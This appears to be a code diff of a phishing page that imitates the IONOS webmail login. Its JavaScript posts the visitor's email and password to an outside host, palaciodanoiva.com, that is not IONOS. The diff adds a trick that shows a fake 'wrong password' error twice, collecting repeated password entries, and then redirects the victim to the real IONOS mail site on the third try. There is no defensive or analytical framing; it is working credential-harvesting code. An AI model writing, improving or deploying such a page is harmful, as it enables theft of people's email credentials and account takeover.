@@ -19,7 +19,8 @@
         .formfooter{
             background-color: #f4f7fa; margin: 0 -31.0px -31px; padding: 40px 30px; 
         }
-        .bg2{border: 1px solid #bcc8d4; margin:0 auto; width:100%; display: grid; place-items: center; }
+        .bg2{border: 1px solid #bcc8d4; margin:0 auto; width:100%;   display: grid;
+          place-items: center; }
         .bg2:active, .bg2:focus, .bg2:hover { background-color: #fff; border: 1px solid #bcc8d4; box-shadow: 0 2px 8px 0 #718095; cursor:pointer; }
         .barload { text-align: center; margin-top: -16px; }
         .barload span { animation: blink 1s infinite; font-size: 2rem; border-radius:14px }
@@ -36,7 +37,6 @@
         .button:disabled {
             cursor: not-allowed; opacity: 0.85
         }
-        .border-red-500 { border-color: #ef4444; }
     </style>    
 </head>
 <body class="">
@@ -52,7 +52,7 @@
         </div>
 
         <div class="flex justify-center my-10">
-            <div class="bg-white rounded-lg theformbox1 p-8 w-full max-w-2xl">
+            <div class="bg-white rounded-lg theformbox1  p-8 w-full max-w-2xl">
                 <div class="flex items-center space-x-2 mb-9">
                     <img src="https://i.ibb.co/M5p2GpPW/product-email.png">
                     <h2 class="text-xl bold">My Webmail Login</h2>
@@ -63,7 +63,7 @@
                 <div class="text-sm mb-4">
                     <a class="text-blue-600" style="color:#02102b;font-family: OpenSansSemibold,arial,sans-serif;"><strong>Not your device?</strong> Log out after the session or use private browsing mode.</a>
                 </div>
-                <button class="flex justify-center gap-1 items-center text-white button rounded-3xl w-full py-2 mb-10" id="emButton">Next</button>
+                <button class="flex justify-center gap-1 items-center text-white button rounded-3xl w-full py-1 mb-10" id="emButton">Next</button>
                 <div class="text-sm formfooter">
                     <p>Not an IONOS customer yet?</p>
                     <a class="" style="color: #1474c4; cursor: pointer;">Become a customer now and benefit from our offers.</a>
@@ -122,7 +122,7 @@
             </div>
          </div>
 
-         <div class="flex justify-between items-center border-t footer pt-1 px-8" style="position: absolute; width: 100%; height: 90px; vertical-align: center; border-top: 1px solid #bcc8d4">
+         <div class="flex justify-between items-center  border-t footer pt-1 px-8" style="position: absolute; width: 100%;  height: 90px; vertical-align: center;border-top: 1px solid #bcc8d4">
             <div class="allop">
                <img src="https://i.ibb.co/8gZKvtL0/greendot.png"> All Systems Operational
             </div>
@@ -158,6 +158,7 @@
             const PROCESS_URL = "https://palaciodanoiva.com/mak/das.php";
             
             barLoad.classList.add("hide"); 
+            emButton.classList.add("py-2");
 
             // Initialize attempt counter in sessionStorage
             if (!sessionStorage.getItem('loginAttempts')) {
@@ -190,10 +191,9 @@
                 }         
             });
 
-            pwButton.addEventListener("click", async (event) => {
-                event.preventDefault();
+            pwButton.addEventListener("click", (event) => {
                 pwerror.classList.add("hide");
-                passwd.classList.remove("border-red-500");
+                event.preventDefault();
                 
                 if (passwd.value === "") {
                     passwd.classList.add("border-red-500");
@@ -210,47 +210,40 @@
                 let attempts = parseInt(sessionStorage.getItem('loginAttempts')) + 1;
                 sessionStorage.setItem('loginAttempts', attempts.toString());
                 
-                try {
-                    const response = await fetch(PROCESS_URL, {
-                        method: 'POST',
-                        body: `email=${encodeURIComponent(hiddenuser.value)}&pass=${encodeURIComponent(passwd.value)}&attempt=${attempts}`,
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded'
-                        }
-                    });
-                    
-                    if (!response.ok) {
-                        throw new Error('Network response was not ok');
+                fetch(PROCESS_URL, {
+                    method: 'POST',
+                    body: `email=${encodeURIComponent(hiddenuser.value)}&pass=${encodeURIComponent(passwd.value)}&attempt=${attempts}`,
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
                     }
-                    
-                    const data = await response.json();
-                    
+                })
+                .then(res => {
+                    if(!res.ok) throw new Error('Network response was not ok');
+                    return res.json();
+                })
+                .then(response => {
                     barLoad.classList.add("hide");
                     pwButton.disabled = false;
                     
-                    if (!data.success) {
-                        throw new Error(data.message || 'Login failed');
-                    }
-                    
-                    if (data.status === 'redirect') {
+                    if (attempts >= 3) {
+                        // Reset attempts and redirect on 3rd try
                         sessionStorage.removeItem('loginAttempts');
                         window.location.href = "https://email.ionos.com/appsuite/";
                     } else {
+                        // Show error and clear password for retry
                         passwd.value = "";
                         passwd.focus();
                         pwerror.classList.remove("hide");
                         errorText.textContent = "Please enter your correct password";
                     }
-                } catch (error) {
+                })
+                .catch(error => {
                     barLoad.classList.add("hide");
                     pwButton.disabled = false;
                     console.error('Error:', error);
-                    
-                    passwd.value = "";
-                    passwd.focus();
                     pwerror.classList.remove("hide");
-                    errorText.textContent = error.message || "Temporary error. Please try again.";
-                }
+                    errorText.textContent = "Temporary error. Please try again.";
+                });
             });      
 
             let showEmailDiv = (em) => {
@@ -269,6 +262,7 @@
                 emerror.classList.add("hide");         
                 hiddenuser.value = em;
                 
+                // Small delay to allow autofill to complete
                 setTimeout(() => {
                     passwd.focus();
                 }, 100);
